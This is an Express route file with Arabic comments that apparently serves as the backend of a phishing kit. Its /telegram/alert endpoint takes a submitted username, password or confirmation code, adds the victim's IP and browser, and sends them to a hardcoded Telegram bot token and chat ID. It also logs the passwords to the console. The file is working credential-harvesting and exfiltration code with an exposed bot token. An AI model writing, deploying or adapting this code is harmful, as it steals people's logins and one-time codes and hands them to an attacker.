import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

// ============================================
// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام
// ============================================
router.post("/telegram/alert", async (req: Request, res: Response) => {
  console.log('📥 1. Request received at /telegram/alert');
  console.log('📥 2. Request body:', req.body);
  console.log('📥 3. Headers:', req.headers);

  try {
    // ✅ استقبال البيانات من الطلب
    const { username, password, timestamp, userAgent } = req.body;
    console.log('📥 4. Extracted data:', { username, password, timestamp, userAgent });

    // ✅ التحقق من وجود البيانات المطلوبة
    if (!username) {
      console.log('❌ Username is missing');
      return res.status(400).json({ error: "Username is required" });
    }

    // الحصول على التوكن ومعرف الدردشة
    const botToken = "8343424889:AAHtbDZ-Iew8OxxFrUbkymtjobhdPWwtN-U";
    const chatId = "8241058661";
    console.log('📥 5. Bot Token exists?', !!botToken);
    console.log('📥 6. Chat ID exists?', !!chatId);

    // ✅ التحقق من إعدادات التليجرام
    if (!botToken || !chatId) {
      console.error("⚠️ Telegram credentials not configured");
      console.error("⚠️ botToken:", botToken);
      console.error("⚠️ chatId:", chatId);
      return res.status(500).json({ error: "Telegram not configured" });
    }

    // الحصول على IP المستخدم (مع مراعاة الـ Proxy)
    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';

    // ============================================
    // 📝 بناء الرسالة مع التفرقة بين النوعين
    // ============================================
    // ✅ تمييز إذا كان رمز تأكيد أو بيانات دخول
    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 *رمز التأكيد*" : "🔐 *محاولة دخول جديدة*";
    const label = isCode ? "📱 *رمز التأكيد:*" : "🔑 *كلمة المرور:*";

    const message = `
${title}

👤 *اسم المستخدم:* ${username}
${label} ${password}
⏱️ *الوقت:* ${timestamp || new Date().toLocaleString()}
🌐 *IP:* ${ip}
📱 *المتصفح:* ${userAgent || 'غير معروف'}
    `;

    console.log('📥 7. Message to send:', message);

    // إرسال الرسالة إلى تليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log('📥 8. Telegram URL:', url.replace(botToken, 'HIDDEN'));

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    console.log('📥 9. Telegram response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram error:", errorText);
      return res.status(500).json({ error: "Failed to send Telegram message" });
    }

    console.log("✅ Telegram notification sent for user:", username);
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("❌ Telegram alert error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;